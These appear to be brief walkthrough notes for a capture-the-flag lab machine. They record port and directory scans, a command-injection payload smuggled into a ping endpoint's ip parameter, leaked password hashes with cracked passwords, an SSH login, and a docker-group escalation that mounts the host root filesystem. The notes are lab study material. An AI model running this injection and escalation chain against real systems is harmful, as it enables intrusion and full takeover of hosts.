map -sC -sV -A 10.10.132.93 -p- -oN initial
  
gobuster dir -u http://10.10.132.93:8081 -w /usr/share/wordlists/dirb/common.txt -t 100 -e
gobuster dir -u http://10.10.132.93:31331 -w /usr/share/wordlists/dirb/common.txt -t 100 -e  

http://10.10.132.93:8081/ping?ip=`ls%20-la`  
ping: )
���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded  

root - f357a0c52799563c7c7b76c1e7543a32 - n100906  
admin - 0d0ea5111e3c1def594c1684e3b9be84 - mrsheafy  

ssh r00t@10.10.132.93  
user is in the docker group  

gtfo bins - docker run -v /:/mnt --rm -it bash chroot /mnt sh  
